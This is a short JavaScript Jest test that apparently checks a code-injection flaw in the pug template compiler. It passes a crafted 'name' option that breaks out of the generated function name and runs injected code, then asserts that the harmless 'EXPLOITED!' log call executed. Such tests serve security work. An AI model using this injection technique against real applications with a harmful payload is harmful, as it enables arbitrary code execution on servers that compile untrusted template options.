test("Arbitrary code execution in pug", (done) => {
  const pug = require('pug');
  const runtimeWrap = require('pug-runtime/wrap');

  console.log = jest.fn();

  var options = {
    name: "template() { console.log('EXPLOITED!'); }; function asdf"
  };

  var body = pug.compileClient("string of pug", options);

  runtimeWrap(body)();

  expect(console.log).toHaveBeenCalledWith('EXPLOITED!');
  done();
});
